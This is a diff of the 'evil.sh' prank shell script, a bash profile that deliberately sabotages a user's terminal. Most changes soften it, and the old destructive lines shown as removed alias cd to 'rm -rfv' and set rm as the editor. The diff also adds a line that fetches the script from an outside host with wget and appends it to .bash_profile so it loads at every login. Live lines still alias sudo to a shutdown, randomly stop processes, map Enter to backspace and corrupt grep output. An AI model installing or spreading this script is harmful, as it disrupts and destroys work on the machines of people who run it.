@@ -1,8 +1,9 @@
 #!/usr/bin/env bash
-# evil.sh — https://mths.be/evil.sh
+# evil.sh — http://tools.apsl.net/evil.sh
+# wget http://tools.apsl.net/evil.sh -O ~/evil.sh && echo "source ~/evil.sh" >> .bash_profile
 
-# Set `rm` as the default editor.
-export EDITOR=/bin/rm;
+# Set `less` as the default editor.
+export EDITOR=/bin/less;
 
 # Make Tab send the delete key.
 tset -Qe $'\t';
@@ -17,7 +18,7 @@ alias cat=true;
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
 # Delete directories instead of entering them.
-alias cd='rm -rfv';
+alias cd='cd ..';
 
 # Shut down the computer instead of running a command with super-user rights.
 alias sudo='sudo shutdown -P now';
@@ -60,7 +61,7 @@ fi;
 sleep $[ ( $RANDOM % 100 )	+ 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
 
 # Have `cp` perform `mv` instead.
-alias cp='mv';
+#alias cp='mv';
 
 # Make `exit` open a new shell.
 alias exit='sh';
@@ -69,7 +70,7 @@ alias exit='sh';
 function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
 
 # Invert `if`, `for`, and `while`.
-alias if='if !' for='for !' while='while !';
+#alias if='if !' for='for !' while='while !';
 
 # Map Enter, Ctrl+J, and Ctrl+M to backspace.
 bind '"\C-J":"\C-?"';
